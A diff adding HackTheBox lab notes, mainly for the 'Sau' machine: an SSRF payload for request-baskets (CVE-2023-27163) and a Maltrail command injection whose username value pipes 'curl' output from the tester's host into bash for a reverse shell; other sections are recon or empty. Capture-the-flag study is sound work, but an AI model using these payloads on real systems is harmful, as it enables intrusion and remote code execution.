@@ -3,7 +3,9 @@
 * [W1 - Sandworm (Medium)](#Week-1---Sandworm-(Medium))
 * [W2 - Pilgrimage (Easy)](#Week-2---Pilgrimage-(Easy))
 * [W3 - Intentions (hard)](#Week-3---Intentions-(Hard))
-* [W4 - sau (Easy)](#Week-4---sau-(Easy))
+* [W4 - Sau (Easy)](#Week-4---Sau-(Easy))
+* [W5 - Authority (Medium)](#Week-5---Authority-(Medium))
+* [W6 - RegistryTwo (Insane)](#Week-6---RegistryTwo-(Insane))
 # Week 1 - Sandworm (Medium)
 // 1 - random name
 // 2 - {{7*7}} name
@@ -452,16 +454,95 @@ print(current_read)
 
 Running it on the box we get the ssh key and login as root. 
 # Week 4 - sau (Easy)
+https://pwnme.in/sau-hackthebox/
+
+Foothold: This basket is powered by “you can google it”. Look up for any flaws this software had in the past and test it from your side.
+
+User: After you find the flaw, see what other places you can reach. Repeat the googling and get initial access.
+
+Root: Your tipical PE, pretty straight forward.Foothold: This basket is powered by “you can google it”. Look up for any flaws this software had in the past and test it from your side.
 ## Reco
+- nmap -sVC <ip> --min-rate=500
+    - 22 SSH
+    - 80 HTTP (filtered)
+    - 55555 Unknown
+- explore Website (http://10.10.11.224:55555)
+    - storing Baskets
+    - footer: ![](https://hackmd.io/_uploads/Syj9YVFK3.png)
+    - This web service allows for flexible collection of HTTP requests and examination through a RESTful API or a simple web user interface.
 
 ## Weaponisation
+- request-basket v1.2.1 is vuln to SSRF
+    - [CVE-2023-27163](https://feedly.com/cve/CVE-2023-27163)
+        - via component `/api/baskets/{name}` or `/baskets/{name}`
+            - we can craft API request to access network resources
 
 ## Exploitation
+- [exploit for the CVE](https://notes.sjtu.edu.cn/s/MUUhEymt7)
+1. vector: payload for BURP:
+```
+{
+    "forward_url": "http://127.0.0.1:80",
+    "proxy_response": false,
+    "insecure_tls": false,
+    "expand_path": true,
+    "capacity": 250
+}
+```
+![](https://hackmd.io/_uploads/Bk3vS1ntn.png)
+
+- we obtained the token 
+    ![](https://hackmd.io/_uploads/BJGcrynK2.png)
+- By exploiting the SSRF vulnerability, we will be able to create a specific route that we can access. Once inside this route, we can proceed to exploit the SSRF vulnerability.
+2. SSRF vulnerability:
+    - [maltrail](https://github.com/stamparm/maltrail)
+        - When accessing the route generated through the exploitation of the SSRF vulnerability, we encountered the Maltrail application. Maltrail is a malicious traffic detection system that utilizes public lists of suspicious and malicious traces, along with static traces obtained from reports of multiple antivirus providers. 
+            - It is worth noting that this version of Maltrail is outdated (v0.53)
+                - [CVE detail #1](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)
+                - [CVE detail #2](https://github.com/stamparm/maltrail/blob/master/core/httpd.py#L399)
+        - During the analysis, an unauthenticated command execution vulnerability has been identified in the `subprocess.check_output` function located in the file `mailtrail/core/http.py` of Maltrail. The presence of a command injection in the `params.get("username")` parameter is the cause of this vulnerability.
     
+        ![](https://hackmd.io/_uploads/SJSFD1nK3.png)
+        - By exploiting the SSRF vulnerability and sending the required parameters in a POST request to the login route, we will be able to execute commands on the system and eventually escalate privileges.
+    
+            ![](https://hackmd.io/_uploads/B1B4Hm3K3.png)
+            - username=;`curl 10.10.14.17:1234 | bash`'
+            - Reverse shell connection established
+                
+
+                    
+    
+
 ## User flag
     
 ## Root flag
 
 
+# Week 5 - Authority (Medium)
+## Reco
+`sudo nmap -sVC 10.10.11.222 --min-rate=500`
+- There are some ports open
+    - 53 (domain)
+    - 80 (HTTP, MS IIS httpd 10.0)
+    - 88 (kerberos-sec)
+    - 135 (msrpc)
+    - 139 (netbios-ssn)
+    - 389, 636, 3268, 3269 (ssl, ldap)
+    - 445 (ms-ds)
+    - 464 (kpasswd5?)
+    - 593 (ncacn_http, RPC over HTTP 1.0)
+    - 8443 (ssl/https-alt)
+- there are some host scripts
+    - clock-skew
+    - smb2
+## Weaponisation
+## Exploitation
+## User flag
+## Root flag
 
-
+# Week 6 - RegistryTwo (Insane)
+## Reco
+## Weaponisation
+## Exploitation
+## User flag
+## Root flag
